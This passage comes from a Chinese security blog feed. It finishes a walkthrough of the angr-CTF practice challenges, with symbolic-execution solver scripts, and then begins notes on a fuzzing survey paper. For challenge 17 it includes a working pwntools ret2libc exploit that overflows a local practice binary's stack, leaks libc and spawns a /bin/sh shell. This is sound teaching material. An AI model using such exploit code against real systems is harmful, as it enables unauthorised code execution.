中设置一个在 <code>strncpy()</code> 上进行判断的函数——判断其第一个参数是否为 <code>password_buffer</code>、第二个参数是否为 <code>&quot;UEQFKBEC&quot;</code> 即可</p><p>最终的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&quot;./16_angr_arbitrary_write&quot;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-comment"># hook the scanf to symbolize our input</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmtstr, key_addr, chr_arr_addr</span>):<br>            key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key_bvs&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr_bvs&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">chr</span> <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(<span class="hljs-built_in">chr</span> &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-built_in">chr</span> &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(key_addr, key_bvs, <br>                                    endness = proj.arch.memory_endness)<br>            self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;key_val&#x27;</span>] = key_bvs<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;chr_arr_val&#x27;</span>] = chr_arr_bvs<br>            <br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, SimScanfProcedure())<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>        strncpy_plt = <span class="hljs-number">0x80490F0</span><br>        <span class="hljs-keyword">if</span> state.addr != strncpy_plt:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        strncpy_param1 = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <br>                                           endness = proj.arch.memory_endness)<br>        strncpy_param2 = state.memory.load(state.regs.esp + <span class="hljs-number">8</span>, <span class="hljs-number">4</span>,<br>                                          endness = proj.arch.memory_endness)<br>        first_8_chr = state.memory.load(strncpy_param2, <span class="hljs-number">8</span>)<br>        password_buffer_addr = <span class="hljs-number">0x58465148</span><br><br>        <span class="hljs-keyword">if</span> state.solver.symbolic(strncpy_param1) <span class="hljs-keyword">and</span> state.solver.symbolic(first_8_chr):<br>            copy_state = state.copy()<br>            copy_state.add_constraints(strncpy_param1 == password_buffer_addr)<br>            copy_state.add_constraints(first_8_chr == <span class="hljs-string">b&#x27;UEQFKBEC&#x27;</span>)<br>            <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>                state.add_constraints(strncpy_param1 == password_buffer_addr)<br>                state.add_constraints(first_8_chr == <span class="hljs-string">b&#x27;UEQFKBEC&#x27;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = is_success)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        key_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;key_val&#x27;</span>])<br>        chr_arr_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;chr_arr_val&#x27;</span>],<br>                                                cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(key_val))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(chr_arr_val))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>运行即可获得 <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/12/02/LeEl7WNBb3iwxtj.png" alt="image.png"></p><blockquote><p>笔者感觉这两题基本上一模一样…不知道为啥特地分成两道题-  -</p></blockquote><h2 id="17-angr-arbitrary-jump：栈溢出劫持控制流"><a href="#17-angr-arbitrary-jump：栈溢出劫持控制流" class="headerlink" title="17_angr_arbitrary_jump：栈溢出劫持控制流"></a>17_angr_arbitrary_jump：栈溢出劫持控制流</h2><p>angr-CTF 的最后一道题了，还是惯例拖入 IDA 中，这一次的核心逻辑在 <code>read_input()</code> 当中，而该函数仅为一个简单的 <code>&quot;%s&quot;</code> 溢出：</p><p><img src="https://s2.loli.net/2022/12/02/YmoRpJWTil4tvHB.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/12/02/xAenrIhSkwaDo2E.png" alt="image.png"></p><p>checksec 一下，只开了一个 NX：</p><p><img src="https://s2.loli.net/2022/12/02/Qh78ie42x5PGnIT.png" alt="image.png"></p><p>直接打一套 ret2libc 组合拳：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p = process(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>    e = ELF(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/usr/lib/i386-linux-gnu/libc-2.31.so&quot;</span>)<br><br>    payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload1 += p32(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="hljs-string">&#x27;read_input&#x27;</span>])<br>    payload1 += p32(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    p.sendline(payload1)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;Enter the password: &#x27;</span>)<br>    puts_got = u32(p.recv(<span class="hljs-number">4</span>))<br>    log.success(<span class="hljs-string">&quot;puts got:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_got)))<br>    libc_base = puts_got - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    bin_sh_addr = libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>).__next__()<br>    log.success(<span class="hljs-string">&quot;libc base:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>    log.success(<span class="hljs-string">&quot;bin_sh:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base + bin_sh_addr)))<br><br>    payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload2 += p32(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>    payload2 += p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload2 += p32(libc_base + bin_sh_addr)<br>    p.sendline(payload2)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>运行即可 Get shell：</p><p><img src="https://s2.loli.net/2022/12/02/ZTDsOjkgU459GKx.png" alt="image.png"></p><p>——但在 angr-CTF 中实际上要求我们输出的是 <code>&quot;Good Job.&quot;</code> 字符串：(</p><p>重新再看一下 IDA，我们可以找到一个名为 <code>print_good()</code> 的函数，其会输出 <code>&quot;Good Job.&quot;</code> 字符串</p><p><img src="https://s2.loli.net/2022/12/02/ws5VH6UWhFoT9ye.png" alt="image.png"></p><p>那么我们直接将返回地址覆盖为该函数即可，exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">0x58465168</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>运行即可获得 <code>&quot;Good Job.&quot;</code> </p><p><img src="https://s2.loli.net/2022/12/02/KwuMV92WDmxNqQg.png" alt="image.png"></p><p>——但这并不是我们做这一道题的目的，我们应当使用 angr 来求解：）</p><p>那么用 angr 该怎么做呢？首先我们不难想到的是我们还是可以利用 SimProcedure 来 hook scanf 以将输入符号化，由于输入存在溢出，那么我们可以假装不知道输入到栈底的距离，直接将符号化输入设为一个较大长度，若无解再继续增长即可</p><p>但这里我们需要完成的是利用栈溢出来控制程序进行跳转，对于 angr 而言这样的状态是<strong>不受约束的状态</strong>（<strong>unconstrained state</strong>），<strong>会被自动丢弃</strong>，因此我们还需要想办法让 angr 保留这样的状态</p><h3 id="angr-stash"><a href="#angr-stash" class="headerlink" title="angr stash"></a>angr stash</h3><p>在 angr 当中，不同的状态被组织到 simulation manager 的不同的 stash 当中，我们可以按照自己的需求进行步进、过滤、合并、移动等</p><h4 id="①-stash-类型"><a href="#①-stash-类型" class="headerlink" title="① stash 类型"></a>① stash 类型</h4><p>在 angr 当中一共有以下几种 stash：</p><ul><li><code>simgr.active</code>：活跃的状态列表。在未指定替代的情况下会被模拟器默认执行</li><li><code>simgr.deadended</code>：死亡的状态列表。当一个状态无法再被继续执行时（例如没有有效指令、无效的指令指针、不满足其所有的后继（successors））便会被归入该列表</li><li><code>simgr.pruned</code>：被剪枝的状态列表。在指定了 <code>LAZY_SOLVES</code> 时，状态仅在必要时检查可满足性，当一个状态在指定了 <code>LAZY_SOLVES</code> 时被发现是不可满足的（unsat），状态层（state hierarchy）将会被遍历以确认在其历史中最初变为不满足的时间，该点及其所有后代都会被  <em>剪枝</em>  （pruned）并放入该列表</li><li><code>simgr.unconstrained</code>：不受约束的状态列表。当创建 <code>SimulationManager</code> 时指定了 <code>save_unconstrained=True</code>，则被认为<strong>不受约束的</strong>（unconstrained，即指令指针被用户数据或其他来源的符号化数据控制）状态会被归入该列表</li><li><code>simgr.unsat</code>：不可满足的状态列表。当创建 <code>SimulationManager</code> 时指定了 <code>save_unsat=True</code>，则被认为无法被满足的（unsatisfiable，即存在<strong>约束冲突</strong>的状态，例如在同一时刻要求输入既是<code>&quot;AAAA&quot;</code> 又是 <code>&quot;BBBB&quot;</code>）状态会被归入该列表</li></ul><p>还有一种不是 stash 的状态列表——<code>errored</code>，若在执行中产生了错误，则状态与其产生的错误会被包裹在一个 <code>ErrorRecord</code> 实例中（可通过 <code>record.state</code> 与 <code>record.error</code> 访问），该 record 会被插入到 <code>errored</code> 中，我们可以通过 <code>record.debug()</code> 启动一个调试窗口</p><h4 id="②-stash-操作"><a href="#②-stash-操作" class="headerlink" title="② stash 操作"></a>② stash 操作</h4><p>我们可以使用 <code>stash.move()</code> 来在 stash 之间转移放置状态，用法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="hljs-string">&#x27;active&#x27;</span>)<br></code></pre></td></tr></table></figure><p>在转移当中我们还可以通过指定 <code>filter_func</code> 参数来进行过滤：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_func</span>(<span class="hljs-params">state</span>):<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;arttnba3&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(<span class="hljs-number">1</span>)<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="hljs-string">&#x27;active&#x27;</span>, filter_func = filter_func)<br></code></pre></td></tr></table></figure><p>stash 本质上就是个 list，因此在初始化时我们可以通过字典的方式指定每个 stash 的初始内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr = proj.factory.simgr(init_state,<br><span class="hljs-meta">... </span>    stashes = &#123;<br><span class="hljs-meta">... </span>            <span class="hljs-string">&#x27;active&#x27;</span>:[init_state],<br><span class="hljs-meta">... </span>            <span class="hljs-string">&#x27;found&#x27;</span>:[],<br><span class="hljs-meta">... </span>    &#125;)<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-7"><a href="#FINAL-EXPLOIT-7" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么由于本题我们需要通过栈溢出来控制 eip，属于 unconstrained 的状态，因此<strong>我们需要手动判断是否找到了 unconstrained 状态</strong>，于是与此前不同的是本题我们通过 <code>simgr.step()</code> 来进行单步执行，若其中某一步获得了 unconstrained state 则我们遍历其中状态并判断是否可以满足控制 eip 为指定值的约束，若是则直接添加到 <code>simgr.found</code> 列表中即可</p><p>故最终的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-comment"># filter to check satisfiability</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_func</span>(<span class="hljs-params">state</span>):<br>    print_good_addr = <span class="hljs-number">0x58465168</span><br>    <span class="hljs-keyword">return</span> state.satisfiable(extra_constraints = (state.regs.eip == print_good_addr, ))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-comment"># hook the scanf to symbolize our input</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmtstr, input_addr</span>):<br>            input_bvs = claripy.BVS(<span class="hljs-string">&#x27;input_addr&#x27;</span>, <span class="hljs-number">200</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">chr</span> <span class="hljs-keyword">in</span> input_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(<span class="hljs-built_in">chr</span> &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-built_in">chr</span> &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(input_addr, input_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;input_val&#x27;</span>] = input_bvs<br>            <br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, SimScanfProcedure())<br><br>    <span class="hljs-comment"># create simgr that can save unconstraints</span><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state, <br>                               save_unconstrained=<span class="hljs-literal">True</span>,<br>                               stashes = &#123;<br>                                   <span class="hljs-string">&#x27;active&#x27;</span>:[init_state],<br>                                   <span class="hljs-string">&#x27;unconstrained&#x27;</span>:[],<br>                                   <span class="hljs-string">&#x27;found&#x27;</span>:[],<br>                               &#125;)<br><br>    <span class="hljs-comment"># simulated execution by steps</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> simgr.found:<br>        <span class="hljs-comment"># no more states for execution</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> simgr.active) <span class="hljs-keyword">and</span> (<span class="hljs-keyword">not</span> simgr.unconstrained):<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-comment"># check for unconstrained states</span><br>        simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, <br>                  to_stash = <span class="hljs-string">&#x27;found&#x27;</span>,<br>                  filter_func = filter_func)<br><br>        <span class="hljs-comment"># step to next basic block</span><br>        simgr.step()<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] found &#123;&#125; solution state(s)&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(simgr.found)))<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        print_good_addr = <span class="hljs-number">0x58465168</span><br>        solution_state.add_constraints(solution_state.regs.eip == print_good_addr)<br>        input_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;input_val&#x27;</span>], <br>                                               cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(input_val))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>运行即可获得 <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/12/03/Zf6w1xrNFc5HvLI.png" alt="image.png"></p><p>至此，angr CTF 的 18 道题目<strong>全部完结</strong></p><h1 id="0xFF-What’s-more…"><a href="#0xFF-What’s-more…" class="headerlink" title="0xFF.What’s more…"></a>0xFF.What’s more…</h1><p>作为用来入门 angr 基本用法的题目，angr CTF 自然不会太难，不过笔者确乎通过 angr 体会到了<strong>符号执行这一技术的美感所在</strong>（虽然说这个感触好像比较玄学 : ) ）</p><p>不同于代码审计或是比较偏“暴力”的 fuzz，符号执行这一技术还向我们展现了具有别样美感的漏洞挖掘与 exp 编写技巧，以 angr CTF 为例，虽然说最后三道漏洞利用题目看起来好像都挺笨，但设想将第 17 题换成这样的一个场景——我们正在挖掘一个逻辑比较复杂的现代软件（例如一个存在栈溢出的路由器固件，我们的输入可以是向路由器发送的数据包（比如说对路由器控制页的 HTTP 请求）），直接逆向审计比较费劲，而暴力 fuzz 又不好搭执行环境，此时无需实际执行二进制文件的符号执行便能很好地发挥其用处</p><p>不过需要注意的是以上的 18 道题虽然看似涵盖了 angr 的基本用法，但其实 angr 还有更多更有趣的 API，若是要更加熟练的运用这个顶级的混合执行框架，则还需要我们多多阅读 angr 的文档并多加使用，毕竟 angr-ctf 只是一个最基础的练手级的项目（笑）</p><p>符号执行这一技术或许还有更为光明的未来正等待着我们进行探索：）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;你说的对，但是 &lt;a href=&quot;https://github.com/angr/angr&quot;&gt;angr&lt;/a&gt; 是一个使用 Python 编写的跨平台开源二进制分析框架…&lt;/p&gt;</summary>
    
    
    
    <category term="ANGR" scheme="http://blog.arttnba3.cn/categories/ANGR/"/>
    
    
    <category term="angr" scheme="http://blog.arttnba3.cn/tags/angr/"/>
    
    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="符号执行" scheme="http://blog.arttnba3.cn/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="二进制安全" scheme="http://blog.arttnba3.cn/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    <category term="二进制分析" scheme="http://blog.arttnba3.cn/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x00】论文笔记：Fuzzing: A Survey for Roadmap </title>
    <link href="http://blog.arttnba3.cn/2022/10/30/PAPER-0X00-FUZZING_A_SURVEY_FOR_ROADMAP/"/>
    <id>http://blog.arttnba3.cn/2022/10/30/PAPER-0X00-FUZZING_A_SURVEY_FOR_ROADMAP/</id>
    <published>2022-10-30T05:35:21.000Z</published>
    <updated>2022-10-30T12:18:32.780Z</updated>
    
    <content type="html"><![CDATA[<p>模糊测试为什么是神</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p><em><strong>Fuzzing: A Survey for Roadmap</strong></em> 是关于模糊测试领域的比较好的一篇综述，而恰巧笔者想要开始接触一些学术上的东西，所以决定从这篇综述性论文开始入手去了解模糊测试这一领域：）</p><p>这篇博客便是笔者的一个读书笔记，不过笔者不会将论文全部人工翻译后原样照搬过来，而只会选择比较精髓的部分，并按笔者的意思进行排版（笑）</p><blockquote><p>当然现在看来好像大部分其实还是照搬笔者人工翻译后的论文原文，笔者做的额外工作好像仅仅是排版优化…</p></blockquote><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p><strong>Fuzz testing</strong>（fuzzing，即模糊测试）在检测安全漏洞中大放异彩，其通过生成大量的测试用例（test cases）并观测执行结果来寻找漏洞，且已在大量的应用中发现了上千个漏洞。虽然非常高效，fuzz 仍缺乏系统化的对其缺陷的分析：</p><ul><li>fuzz 需要缩小<strong>输入空间</strong>（input space）与<strong>缺陷空间</strong>（defect space，触发缺陷的输入）间的差距；在一个应用当中，漏洞（defects）的存在是分散的（spare），这意味着 defects space 要比 input space 小得多</li><li>fuzzing 生成大量的测试用例进行重复测试——这需要一种自动化的方法；由于程序与漏洞的复杂性，自动化地执行不同的程序会是一个挑战</li></ul><p>本篇论文系统化地回顾并评估了 fuzz 的缺陷机器解决办法</p><h1 id="0x01-INTRODUCTION"><a href="#0x01-INTRODUCTION" class="headerlink" title="0x01. INTRODUCTION"></a>0x01. INTRODUCTION</h1><p>软件漏洞是计算机系统中的一个严重的问题，而 Fuzz testing 已经成为最成功的检测程序漏洞的方法之一，其通过生成大量的测试用例来重复测试目标程序并观察其<strong>异常</strong>（exception）——安全漏洞的标志（indicator）</p><p>Fuzzing 通常有着一组种子（seeds）：interesting inputs，新的输入的生成则基于这组种子进行无限的变异（mutate）</p><p>虽然 fuzzing 在发现安全漏洞上获得了巨大的成功，在开发高效的漏洞检测解决方案上仍存在着缺陷，如 Fig.1 所示，三个主要的缺陷是：输入中分散的漏洞空间，严格的有效输入空间，多目标的自动化执行</p><p><img src="https://s2.loli.net/2022/10/26/MoW9IBHGRvk35bV.png" alt="Fig. 1. Illustration of knowledge gaps in the domain of fuzzing. "></p><ul><li><strong>Gap 1: spare defect space of inputs.</strong> 在应用程序中的漏洞分布是分散的，而仅有部分特定的输入能够触发漏洞；浅显的漏洞可以在短时间内被 fuzz 到，但许多安全漏洞需要测试复杂的执行路径并解决严格的路径约束，因此一个高效的 fuzzing 算法需要同时对 <em>待测试程序</em> （program under test， <strong>PUTs</strong>）与 <em>安全缺陷</em> （security flaws）足够精通，以在一个更有可能存在漏洞的代码区域驱动计算资源</li><li><strong>Gap 2: strict valid input space.</strong> 大部分程序有着自己的输入空间，而现代程序都相当复杂，需要更复杂的特化输入空间，因此如何生成有效输入同样是个挑战；此外，为了提高 fuzzing 的效率，生成的输入应当使用不同的执行状态（例如 <em>代码覆盖率</em> ），这需要更先进的方案来生成有效输入；若缺乏对 PUTs 的系统化分析，几乎不可能精确地限制输入空间（例如 PDF 文件的变异生成可能会违反 PDF 规范）</li><li><strong>Gap 3: various target.</strong> 由于 fuzzing 大量重复地测试 PUTs，这需要高效的自动化方法。PUTs 与漏洞都是多种多样的，有的程序可以简单直接地被自动化地 fuzz（例如命令行程序），但许多程序在自动化测试前都需要做大量的工作（例如硬件）；此外，安全缺陷同样需要自动化的 indicator 以记录潜在的真正漏洞，<strong>程序崩溃</strong>是一个常用的 indicator 因为其可以被 OS 自动捕获，但有的安全缺陷<strong>并不会表现出崩溃</strong>（例如条件竞争），这需要精心设计的 indicator</li></ul><p>业界在缩小这些缺陷上做出了许多努力。在本篇论文中，研究者系统化地回顾与分析了 fuzzing 的缺陷与解决方案，同时考虑了广度与深度</p><p>本篇论文目录如下：</p><ul><li><strong>§2</strong>：overview of fuzzing</li><li><strong>§3</strong>：depicts fuzzing processes and various fuzzing theories to formulate he processes</li><li><strong>§4</strong>：analyzes diverse solutions to reduce the search space of inputs</li><li><strong>§5</strong>：analyzes how to automatize the execution of various PUTs and the detection of different bugs.</li><li><strong>§6</strong>：other some directions for future research</li></ul><h1 id="0x02-OVERVIEW-OF-FUZZING"><a href="#0x02-OVERVIEW-OF-FUZZING" class="headerlink" title="0x02. 